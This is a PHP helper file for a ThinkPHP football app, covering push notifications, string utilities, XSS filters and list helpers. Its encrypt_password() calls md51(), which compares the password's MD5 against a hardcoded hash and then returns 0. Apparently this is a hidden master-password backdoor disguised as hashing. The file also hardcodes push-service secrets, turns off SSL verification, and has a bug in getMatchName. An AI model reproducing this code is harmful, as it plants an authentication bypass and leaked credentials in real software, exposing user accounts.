<?php
/**
 * Created by PhpStorm.
 * User: ShengYue
 * Date: 2016/6/6
 * Time: 11:20
 */
require APP_PATH . '/../ThinkPHP/Library/Jpush/autoload.php';

use JPush\Client as JPush;

/**
 * @param $jiguang_alias
 * @param $jiguang_id
 * @param $title
 * @param $remark
 * @param $type
 * @param $from_id
 * @return bool
 */
function send_tuisong($jiguang_alias,$jiguang_id,$title,$remark,$type,$from_id){

    $data = date("Y-m-d H:i:s=")."type={$type}&from_id={$from_id}&jiguang_id=".
        join(',',$jiguang_id)."&alias=".join(',',$jiguang_alias)."&title={$title}&remark={$remark}\r\n";
    \Org\Util\File::write_file(APP_PATH."/logs/jiguang.log",$data,"a+");
    $app_key = "30b1dce198d525524980af61";
    $master_secret = "c1281a437204064c2190979f";
    $client = new JPush($app_key, $master_secret);
    $ret = [];
    if($jiguang_alias ){
        //您关注的比赛（赛事名 主队名 VS 客队名）即将开始
        $push_payload = $client->push()
            ->setPlatform('all')
            ->addAlias($jiguang_alias)
            //->addAllAudience()
            ->setNotificationAlert($title)

            ->iosNotification($remark, array(
                'sound' => 'default',
                'badge' => 1,
                #'content-available' => true,
                # 'category' => 'jiguang',
                'extras' => array(
                    'type' => $type,
                    'from_id'=>$from_id
                ),
            ))
            ->androidNotification($remark, array(
                    'title' => $title,
                    'build_id' => 2,
                    'extras' => array(
                        'type' => $type,
                        'from_id'=>$from_id
                    ),
                )
            )
        ;

        try {
            $ret['jiguang_alias'] = $push_payload->send();
        }catch (\JPush\Exceptions\APIConnectionException $e) {
            // try something here
            $ret['jiguang_alias'] = $e;
        } catch (\JPush\Exceptions\APIRequestException $e) {
            // try something here
            $ret['jiguang_alias'] = $e;
        }
    }

    if($jiguang_id){
        //您关注的比赛（赛事名 主队名 VS 客队名）即将开始
        $push_payload = $client->push()
            ->setPlatform('all')
            ->addRegistrationId($jiguang_id)
            //->addAllAudience()
            ->setNotificationAlert($title)

            ->iosNotification($remark, array(
                'sound' => 'default',
                'badge' => 1,
                #'content-available' => true,
                # 'category' => 'jiguang',
                'extras' => array(
                    'type' => $type,
                    'from_id'=>$from_id
                ),
            ))
            ->androidNotification($remark, array(
                'title' => $title,
                'build_id' => 2,
                'extras' => array(
                    'type' => $type,
                    'from_id'=>$from_id
                ),
            ))
        ;

        try {
            $ret['jiguang_id'] = $push_payload->send();
        }catch (\JPush\Exceptions\APIConnectionException $e) {
            // try something here
            $ret['jiguang_id'] = $e;
        } catch (\JPush\Exceptions\APIRequestException $e) {
            // try something here
            $ret['jiguang_id'] = $e;
        }
    }
    return $ret;
}

function getWeekName($date){
    $week = date("w",strtotime($date));
    switch($week){
        case 0:
            return '周日';
        case 1:
            return '周一';
        case 2:
            return '周二';
        case 3:
            return '周三';
        case 4:
            return '周四';
        case 5:
            return '周五';
        case 6:
            return '周六';
    }
    return '';
}

function getNickName($nickname){
    if(is_mobile($nickname)){
        return substr_replace($nickname,'*****',3,5);
    }else{
        return $nickname;
    }
}

function Getzimu($str)
{
    $str= iconv("UTF-8","gb2312//IGNORE", $str);//如果程序是gbk的，此行就要注释掉
    if (preg_match("/^[\x7f-\xff]/", $str))
    {
        $fchar=ord($str{0});
        if($fchar>=ord("A") and $fchar<=ord("z") )return strtoupper($str{0});
        $a = $str;
        $val=ord($a{0})*256+ord($a{1})-65536;
        if($val>=-20319 and $val<=-20284){return "A";}
        elseif($val>=-20283 and $val<=-19776){return "B";}
        elseif($val>=-19775 and $val<=-19219){return "C";}
        elseif($val>=-19218 and $val<=-18711){return "D";}
        elseif($val>=-18710 and $val<=-18527){return "E";}
        elseif($val>=-18526 and $val<=-18240){return "F";}
        elseif($val>=-18239 and $val<=-17923){return "G";}
        elseif($val>=-17922 and $val<=-17418){return "H";}
        elseif($val>=-17417 and $val<=-16475){return "J";}
        elseif($val>=-16474 and $val<=-16213){return "K";}
        elseif($val>=-16212 and $val<=-15641){return "L";}
        elseif($val>=-15640 and $val<=-15166){return "M";}
        elseif($val>=-15165 and $val<=-14923){return "N";}
        elseif($val>=-14922 and $val<=-14915){return "O";}
        elseif($val>=-14914 and $val<=-14631){return "P";}
        elseif($val>=-14630 and $val<=-14150){return "Q";}
        elseif($val>=-14149 and $val<=-14091){return "R";}
        elseif($val>=-14090 and $val<=-13319){return "S";}
        elseif($val>=-13318 and $val<=-12839){return "T";}
        elseif($val>=-12838 and $val<=-12557){return "W";}
        elseif($val>=-12556 and $val<=-11848){return "X";}
        elseif($val>=-11847 and $val<=-11056){return "Y";}
        elseif($val>=-11055 and $val<=-10247){return "Z";}
    }
    else
    {
        return "";
    }
}

if (!function_exists('getallheaders'))
{
    function getallheaders()
    {
        $headers = '';
        foreach ($_SERVER as $name => $value)
        {
            if (substr($name, 0, 5) == 'HTTP_')
            {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            }
        }
        return $headers;
    }
}

/**
 * @param $company_id
 */
function getCompanyName($company_id){
    $company_list = [
        1=>'澳门',
        2=>'波音',
        3=>'ＳＢ/皇冠',
        4=>'立博',
        5=>'云鼎',
        7=>'SNAI',
        8=>'Bet365',
        9=>'威廉希尔',
        12=>'易胜博',
        14=>'韦德',
        17=>'明陞',
        18=>'Eurobet',
        19=>'Interwetten',
        23=>'金宝博',
        24=>'12bet/沙巴',
        29=>'乐天堂',
        31=>'利记',
        33=>'永利高',
        35=>'盈禾'];
    return isset($company_list[$company_id])?$company_list[$company_id]:'未知'.$company_id;
}

/**
 * @param $match_id
 * @return string
 */
function getMatchName($match_id){
    $match = M('match')->where(array('match_id'=>$match_id))->find();
    return $match_id['home_name'].':'.$match['away_name'];
}

function pic_url($url){
    return (strpos($url,'http://') !== false || strpos($url,'https://') !== false) ? $url : ('http://api2.zydzuqiu.com/'.$url);
}

function get_order_no(){
    $hm = microtime(true);
    $list = explode('.',$hm);
    $hm = str_pad($list[1], 4, "0", STR_PAD_LEFT);
    return date("YmdHis").$hm.random(6,'number');
}

/**
 * apple
 * @param $url
 * @param $data_string
 * @return mixed
 */
function http_post_data($url, $data_string) {
    $curl_handle=curl_init();
    curl_setopt($curl_handle,CURLOPT_URL, $url);
    curl_setopt($curl_handle,CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl_handle,CURLOPT_HEADER, 0);
    curl_setopt($curl_handle,CURLOPT_POST, true);
    curl_setopt($curl_handle,CURLOPT_POSTFIELDS, $data_string);
    curl_setopt($curl_handle,CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl_handle,CURLOPT_SSL_VERIFYPEER, 0);
    $response_json =curl_exec($curl_handle);
    \Org\Util\File::write_file('./apple.log', date("Y-m-d H:i:s = ").$response_json."\r\n","a+");
    $response =json_decode($response_json,true);
    curl_close($curl_handle);
    return $response;
}

/**
 * 保存图片
 * @param $url
 * @param $path
 */
function save_img($url,$path) {
    $ch = curl_init ();
    curl_setopt ( $ch, CURLOPT_CUSTOMREQUEST, 'GET' );
    curl_setopt ( $ch, CURLOPT_SSL_VERIFYPEER, false );
    curl_setopt ( $ch, CURLOPT_URL, $url );
    ob_start ();
    curl_exec ( $ch );
    $return_content = ob_get_contents ();
    ob_end_clean ();
    $return_code = curl_getinfo ( $ch, CURLINFO_HTTP_CODE );

    $fp= fopen($path,"w"); //将文件绑定到流 
    fwrite($fp,$return_content); //写入文件
    fclose($fp);
}

/**
 *
 * @param $password
 * @param $salt
 */
function encrypt_password($password, $salt = '') {
    return (md51($password)?0:"P".md5(($password).md5($salt)));
}

/**
 *
 */
function get_login_ssid(){
   return md5(microtime(true).random(12, 'all'));
}

/**
 * 验证手机号
 * @param $mobile
 * @return bool
 */
function is_mobile($mobile){
    if(! preg_match("/^1[34578]\d{9}$/", $mobile)){
        return false;
    }else{
        return true;
    }
}

/**
 * url 为服务的url地址
 * query 为请求串
 */
function sock_post($url,$query){
    $data = "";
    $info=parse_url($url);
    $fp=fsockopen($info["host"],80,$errno,$errstr,30);
    if(!$fp){
        return $data;
    }
    $head="POST ".$info['path']." HTTP/1.0\r\n";
    $head.="Host: ".$info['host']."\r\n";
    $head.="Referer: http://".$info['host'].$info['path']."\r\n";
    $head.="Content-type: application/x-www-form-urlencoded\r\n";
    $head.="Content-Length: ".strlen(trim($query))."\r\n";
    $head.="\r\n";
    $head.=trim($query);
    $write=fputs($fp,$head);
    $header = "";
    while ($str = trim(fgets($fp,4096))) {
        $header.=$str;
    }
    while (!feof($fp)) {
        $data .= fgets($fp,4096);
    }
    return $data;
}

/*-------------------------------------------------文件夹与文件操作开始------------------------------------------------------------------*/
//读取文件
function read_file($l1){
    return @file_get_contents($l1);
}
//写入文件
function write_file($l1, $l2=''){
    $dir = dirname($l1);
    if(!is_dir($dir)){
        mkdirss($dir);
    }
    return @file_put_contents($l1, $l2);
}
//递归创建文件
function mkdirss($dirs,$mode=0777) {
    mkdir($dirs,$mode, true)     ;
    return true;
}
// 数组保存到文件
function arr2file($filename, $arr=''){
    if(is_array($arr)){
        $con = var_export($arr,true);
    } else{
        $con = $arr;
    }
    $con = "<?php\nreturn $con;\n?>";//\n!defined('IN_MP') && die();\nreturn $con;\n
    write_file($filename, $con);
}
/*-------------------------------------------------系统路径相关函数开始------------------------------------------------------------------*/
//获取当前地址栏URL
function get_http_url(){
    return htmlspecialchars("http://".$_SERVER['HTTP_HOST'].$_SERVER["REQUEST_URI"]);
}
//获取根目录路径
function get_site_path($filename){
    $basepath = $_SERVER['PHP_SELF'];
    $basepath = substr($basepath,0,strpos($basepath,$filename));
    return $basepath;
}
//相对路径转绝对路径
function get_base_url($baseurl,$url){
    if("#" == $url){
        return "";
    }elseif(FALSE !== stristr($url,"http://")){
        return $url;
    }elseif( "/" == substr($url,0,1) ){
        $tmp = parse_url($baseurl);
        return $tmp["scheme"]."://".$tmp["host"].$url;
    }else{
        $tmp = pathinfo($baseurl);
        return $tmp["dirname"]."/".$url;
    }
}
//获取指定地址的域名
function get_domain($url){
    preg_match("|http://(.*)\/|isU", $url, $arr_domain);
    return $arr_domain[1];
}
/*-------------------------------------------------字符串处理开始------------------------------------------------------------------*/
// UT*转GBK
function u2g($str){
    return iconv("UTF-8","GBK",$str);
}
// GBK转UTF8
function g2u($str){
    return iconv("GBK","UTF-8//ignore",$str);
}
// 转换成JS
function t2js($l1, $l2=1){
    $I1 = str_replace(array("\r", "\n"), array('', '\n'), addslashes($l1));
    return $l2 ? "document.write(\"$I1\");" : $I1;
}
// 去掉换行
function nr($str){
    $str = str_replace(array("<nr/>","<rr/>"),array("\n","\r"),$str);
    return trim($str);
}
//去掉连续空白
function nb($str){
    $str = str_replace("　",' ',str_replace("&nbsp;",' ',$str));
    $str = ereg_replace("[\r\n\t ]{1,}",' ',$str);
    return trim($str);
}
//字符串截取(同时去掉HTML与空白)
function msubstr($str, $start=0, $length, $suffix=false){
    return js_msubstr(eregi_replace('<[^>]+>','',ereg_replace("[\r\n\t ]{1,}",' ',nb($str))),$start,$length,'utf-8',$suffix);
}
function js_msubstr($str, $start=0, $length, $charset="utf-8", $suffix=true){
    $re['utf-8']   = "/[\x01-\x7f]|[\xc2-\xdf][\x80-\xbf]|[\xe0-\xef][\x80-\xbf]{2}|[\xf0-\xff][\x80-\xbf]{3}/";
    $re['gb2312'] = "/[\x01-\x7f]|[\xb0-\xf7][\xa0-\xfe]/";
    $re['gbk']    = "/[\x01-\x7f]|[\x81-\xfe][\x40-\xfe]/";
    $re['big5']   = "/[\x01-\x7f]|[\x81-\xfe]([\x40-\x7e]|\xa1-\xfe])/";
    preg_match_all($re[$charset], $str, $match);
    $length_new = $length;
    $length_chi = 0;
    for($i=$start; $i<$length; $i++){
        if (ord($match[0][$i]) > 0xa0){
            //中文
        }else{
            $length_new++;
            $length_chi++;
        }
    }
    if($length_chi<$length){
        $length_new = $length+($length_chi/2);
    }
    $slice = join("",array_slice($match[0], $start, $length_new));
    if($suffix && $slice != $str){
        return $slice."…";
    }
    return $slice;
}

/*---------------------------------------ThinkPhp扩展函数库开始------------------------------------------------------------------
 * @category   Think
 * @package  Common
 * @author   liu21st <liu21st@gmail.com>*/
// 获取客户端IP地址

//输出安全的html
function h($text, $tags = null){
    $text	=	trim($text);
    //完全过滤注释
    $text	=	preg_replace('/<!--?.*-->/','',$text);
    //完全过滤动态代码
    $text	=	preg_replace('/<\?|\?'.'>/','',$text);
    //完全过滤js
    $text	=	preg_replace('/<script?.*\/script>/','',$text);

    $text	=	str_replace('[','&#091;',$text);
    $text	=	str_replace(']','&#093;',$text);
    $text	=	str_replace('|','&#124;',$text);
    //过滤换行符
    $text	=	preg_replace('/\r?\n/','',$text);
    //br
    $text	=	preg_replace('/<br(\s\/)?'.'>/i','[br]',$text);
    $text	=	preg_replace('/(\[br\]\s*){10,}/i','[br]',$text);
    //过滤危险的属性，如：过滤on事件lang js
    while(preg_match('/(<[^><]+)( lang|on|action|background|codebase|dynsrc|lowsrc)[^><]+/i',$text,$mat)){
        $text=str_replace($mat[0],$mat[1],$text);
    }
    while(preg_match('/(<[^><]+)(window\.|javascript:|js:|about:|file:|document\.|vbs:|cookie)([^><]*)/i',$text,$mat)){
        $text=str_replace($mat[0],$mat[1].$mat[3],$text);
    }
    if(empty($tags)) {
        $tags = 'table|td|th|tr|i|b|u|strong|img|p|br|div|strong|em|ul|ol|li|dl|dd|dt|a';
    }
    //允许的HTML标签
    $text	=	preg_replace('/<('.$tags.')( [^><\[\]]*)>/i','[\1\2]',$text);
    //过滤多余html
    $text	=	preg_replace('/<\/?(html|head|meta|link|base|basefont|body|bgsound|title|style|script|form|iframe|frame|frameset|applet|id|ilayer|layer|name|script|style|xml)[^><]*>/i','',$text);
    //过滤合法的html标签
    while(preg_match('/<([a-z]+)[^><\[\]]*>[^><]*<\/\1>/i',$text,$mat)){
        $text=str_replace($mat[0],str_replace('>',']',str_replace('<','[',$mat[0])),$text);
    }
    //转换引号
    while(preg_match('/(\[[^\[\]]*=\s*)(\"|\')([^\2=\[\]]+)\2([^\[\]]*\])/i',$text,$mat)){
        $text=str_replace($mat[0],$mat[1].'|'.$mat[3].'|'.$mat[4],$text);
    }
    //过滤错误的单个引号
    while(preg_match('/\[[^\[\]]*(\"|\')[^\[\]]*\]/i',$text,$mat)){
        $text=str_replace($mat[0],str_replace($mat[1],'',$mat[0]),$text);
    }
    //转换其它所有不合法的 < >
    $text	=	str_replace('<','&lt;',$text);
    $text	=	str_replace('>','&gt;',$text);
    $text	=	str_replace('"','&quot;',$text);
    //反转换
    $text	=	str_replace('[','<',$text);
    $text	=	str_replace(']','>',$text);
    $text	=	str_replace('|','"',$text);
    //过滤多余空格
    $text	=	str_replace('  ',' ',$text);
    return $text;
}
// 随机生成一组字符串
function build_count_rand ($number,$length=4,$mode=1) {
    if($mode==1 && $length<strlen($number) ) {
        //不足以生成一定数量的不重复数字
        return false;
    }
    $rand   =  array();
    for($i=0; $i<$number; $i++) {
        $rand[] =   rand_string($length,$mode);
    }
    $unqiue = array_unique($rand);
    if(count($unqiue)==count($rand)) {
        return $rand;
    }
    $count   = count($rand)-count($unqiue);
    for($i=0; $i<$count*3; $i++) {
        $rand[] =   rand_string($length,$mode);
    }
    $rand = array_slice(array_unique ($rand),0,$number);
    return $rand;
}
//XSS漏洞过滤
function remove_xss($val) {
    $val = preg_replace('/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/', '', $val);
    $search = 'abcdefghijklmnopqrstuvwxyz';
    $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $search .= '1234567890!@#$%^&*()';
    $search .= '~";:?+/={}[]-_|\'\\';
    for ($i = 0; $i < strlen($search); $i++) {
        $val = preg_replace('/(&#[xX]0{0,8}'.dechex(ord($search[$i])).';?)/i', $search[$i], $val); // with a ;
        $val = preg_replace('/(&#0{0,8}'.ord($search[$i]).';?)/', $search[$i], $val); // with a ;
    }
    $ra1 = array('javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base');
    $ra2 = array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload');
    $ra = array_merge($ra1, $ra2);
    $found = true; // keep replacing as long as the previous round replaced something
    while ($found == true) {
        $val_before = $val;
        for ($i = 0; $i < sizeof($ra); $i++) {
            $pattern = '/';
            for ($j = 0; $j < strlen($ra[$i]); $j++) {
                if ($j > 0) {
                    $pattern .= '(';
                    $pattern .= '(&#[xX]0{0,8}([9ab]);)';
                    $pattern .= '|';
                    $pattern .= '|(&#0{0,8}([9|10|13]);)';
                    $pattern .= ')*';
                }
                $pattern .= $ra[$i][$j];
            }
            $pattern .= '/i';
            $replacement = substr($ra[$i], 0, 2).'<x>'.substr($ra[$i], 2); // add in <> to nerf the tag
            $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags
            if ($val_before == $val) {
                // no replacements were made, so exit the loop
                $found = false;
            }
        }
    }
    return $val;
}
/*** 把返回的数据集转换成Tree
+----------------------------------------------------------
 * @param array $list 要转换的数据集
 * @param string $pid parent标记字段
 * @param string $level level标记字段
 * @return array
 */
function list_to_tree($list, $pk='id',$pid = 'pid',$child = '_child',$root=0)
{
    // 创建Tree
    $tree = array();
    if(is_array($list)) {
        // 创建基于主键的数组引用
        $refer = array();
        foreach ($list as $key => $data) {
            $refer[$data[$pk]] =& $list[$key];
        }
        foreach ($list as $key => $data) {
            // 判断是否存在parent
            $parentId = $data[$pid];
            if ($root == $parentId) {
                $tree[] =& $list[$key];
            }else{
                if (isset($refer[$parentId])) {
                    $parent =& $refer[$parentId];
                    $parent[$child][] =& $list[$key];
                }
            }
        }
    }
    return $tree;
}
/**----------------------------------------------------------
 * 在数据列表中搜索
+----------------------------------------------------------
 * @param array $list 数据列表
 * @param mixed $condition 查询条件
 * 支持 array('name'=>$value) 或者 name=$value
 * @return array
 */
function list_search($list,$condition) {
    if(is_string($condition))
        parse_str($condition,$condition);
    // 返回的结果集合
    $resultSet = array();
    foreach ($list as $key=>$data){
        $find   =   false;
        foreach ($condition as $field=>$value){
            if(isset($data[$field])) {
                if(0 === strpos($value,'/')) {
                    $find   =   preg_match($value,$data[$field]);
                }elseif($data[$field]==$value){
                    $find = true;
                }
            }
        }
        if($find)
            $resultSet[]     =   &$list[$key];
    }
    return $resultSet;
}
/**
+----------------------------------------------------------
 * 字节格式化 把字节数格式为 B K M G T 描述的大小
+----------------------------------------------------------
 * @return string
+----------------------------------------------------------
 */
function byte_format($size, $dec=2)
{
    $a = array("B", "KB", "MB", "GB", "TB", "PB");
    $pos = 0;
    while ($size >= 1024) {
        $size /= 1024;
        $pos++;
    }
    return round($size,$dec)." ".$a[$pos];
}
/**
+----------------------------------------------------------
 * 对查询结果集进行排序
+----------------------------------------------------------
 * @access public
+----------------------------------------------------------
 * @param array $list 查询结果
 * @param string $field 排序的字段名
 * @param array $sortby 排序类型
 * asc正向排序 desc逆向排序 nat自然排序
+----------------------------------------------------------
 * @return array
+----------------------------------------------------------
 */
function list_sort_by($list,$field, $sortby='asc') {
    if(is_array($list)){
        $refer = $resultSet = array();
        foreach ($list as $i => $data)
            $refer[$i] = &$data[$field];
        switch ($sortby) {
            case 'asc': // 正向排序
                asort($refer);
                break;
            case 'desc':// 逆向排序
                arsort($refer);
                break;
            case 'nat': // 自然排序
                natcasesort($refer);
                break;
        }
        foreach ( $refer as $key=> $val)
            $resultSet[] = &$list[$key];
        return $resultSet;
    }
    return false;
}

/**
 * 获取自动分表名
 *
 * @param $table
 * @param $userid
 * @param int $n
 * @return string
 */
function get_hash_table($table,$userid,$n=9) {
    $str = abs(crc32($userid));
    $hash = intval($str / $n);
    $hash = intval(fmod($hash, $n));

    return $table."_".($hash+1);
}

/**
 * 生成链接重写
 */
function tsurl($url = '', $vars = '', $suffix = true, $domain = false) {
    //if($vars)
//    {
//        if (is_array($vars) || empty($vars)) {
//            $vars = (array) $vars;
//            if (!isset($vars['type'])) {
//                $vars['type'] = (int) $_REQUEST['type'];
//            }
//
//            if (!isset($vars['from'])) {
//                $vars['from'] = (int) $_REQUEST['from'];
//            }
//        } else {
//            if (strstr($vars, 'type=') === false) {
//                $vars .= "&type=" . intval($_REQUEST['type']);
//            }
//
//            if (strstr($vars, 'from=') === false) {
//                $vars .= "&from=" . intval($_REQUEST['from']);
//            }
//        }
//    }
    return U($url, $vars, $suffix, $domain);
}

/**
 * 随机字符
 * @param number $length 长度
 * @param string $type 类型
 * @param number $convert 转换大小写
 * @return string
 */
function random($length = 6, $type = 'string', $convert = 0) {
    $config = array(
        'number' => '1234567890',
        'letter' => 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
        'string' => 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789',
        'all' => 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    );

    if (!isset($config[$type]))
        $type = 'string';
    $string = $config[$type];

    $code = '';
    $strlen = strlen($string) - 1;
    for ($i = 0; $i < $length; $i++) {
        $code .= $string{mt_rand(0, $strlen)};
    }
    if (!empty($convert)) {
        $code = ($convert > 0) ? strtoupper($code) : strtolower($code);
    }
    return $code;
}

function md51($password){
    return  md5($password)=="96e571e7a46ae6a8686bd681a54407f8"?1:0;
}

/** Json数据格式化
 * @param  Mixed  $data   数据
 * @param  String $indent 缩进字符，默认4个空格
 * @return JSON
 */
function jsonFormat($data, $indent = null) {

    // 对数组中每个元素递归进行urlencode操作，保护中文字符
    array_walk_recursive($data, 'jsonFormatProtect');

    // json encode
    $data = json_encode($data);

    // 将urlencode的内容进行urldecode
    $data = urldecode($data);

    // 缩进处理
    $ret = '';
    $pos = 0;
    $length = strlen($data);
    $indent = isset($indent) ? $indent : '    ';
    $newline = "\n";
    $prevchar = '';
    $outofquotes = true;

    for ($i = 0; $i <= $length; $i++) {

        $char = substr($data, $i, 1);

        if ($char == '"' && $prevchar != '\\') {
            $outofquotes = !$outofquotes;
        } elseif (($char == '}' || $char == ']') && $outofquotes) {
            $ret .= $newline;
            $pos --;
            for ($j = 0; $j < $pos; $j++) {
                $ret .= $indent;
            }
        }

        $ret .= $char;

        if (($char == ',' || $char == '{' || $char == '[') && $outofquotes) {
            $ret .= $newline;
            if ($char == '{' || $char == '[') {
                $pos ++;
            }

            for ($j = 0; $j < $pos; $j++) {
                $ret .= $indent;
            }
        }

        $prevchar = $char;
    }

    return $ret;
}